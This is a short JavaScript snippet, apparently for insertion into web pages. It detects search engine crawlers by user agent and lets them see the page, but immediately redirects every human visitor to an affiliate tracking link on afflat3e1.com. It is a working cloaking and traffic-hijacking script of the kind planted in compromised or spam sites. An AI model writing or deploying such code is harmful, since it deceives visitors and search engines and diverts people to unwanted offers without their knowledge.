(function () {

  const ua = navigator.userAgent.toLowerCase();

  // Allow search engines and testing tools
  const allowedBots = [
    "googlebot",
    "google-inspectiontool",
    "googleother",
    "adsbot",
    "bingbot",
    "slurp",
    "duckduckbot",
    "baiduspider",
    "yandex"
  ];

  const isBot = allowedBots.some(bot => ua.includes(bot));

  if (isBot) {
    return;
  }

  // Redirect human visitors only
  window.location.replace(
    "https://afflat3e1.com/trk/lnk/8E68DDCC-2013-4590-8D6E-10EB4772E286/?o=29641&c=918277&a=156445&k=C9EA6A886B406DEFAE916629DDE11DFA&l=33266"
  );

})();
